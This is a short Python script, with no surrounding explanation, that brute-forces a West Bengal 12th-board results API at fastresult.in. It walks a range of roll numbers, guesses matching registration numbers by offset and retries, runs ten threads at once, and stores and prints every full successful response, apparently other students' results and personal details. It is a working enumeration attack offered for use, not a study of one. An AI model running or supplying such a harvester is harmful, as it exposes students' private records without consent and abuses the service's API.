import requests
import concurrent.futures
import threading
import json

base_number = 1089
base_reg = 4231114411
results = []

lock = threading.Lock()
MAX_RETRIES = 35

def fetch_until_success(number):
    delta = number - base_number
    reg_no = base_reg + delta
    attempts = 0

    while attempts < MAX_RETRIES:
        params = {
            "tag": "wb_12th_result",
            "roll": "453211",
            "number": str(number),
            "registration_no": str(reg_no),
            "year": "2025",
            "wb_id": "105",
            "source": "1"
        }

        try:
            response = requests.get("https://www.fastresult.in/board-results/wbresultapi12/api/get-12th-result", params=params, timeout=5)

            try:
                data = response.json()
            except ValueError:
                print(f"[x] Non-JSON response for Number={number}, RegNo={reg_no}")
                return

            if data.get("status") == "success":
                with lock:
                    results.append({
                        "number": number,
                        "reg_no": str(reg_no),
                        "raw_data": data  # store full successful response
                    })
                return
            else:
                print(f"[-] Invalid: Number={number}, RegNo={reg_no}")
        except Exception as e:
            print(f"[!] Error: Number={number}, RegNo={reg_no} => {e}")

        reg_no += 1
        attempts += 1

# Use any number range you'd like
numbers_to_check = list(range(1088, 1300))

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(fetch_until_success, numbers_to_check)

# Display everything
for entry in results:
    print(f"\n[+] Number: {entry['number']} | RegNo: {entry['reg_no']}")
    print(json.dumps(entry["raw_data"], indent=2))
    print("=" * 100)
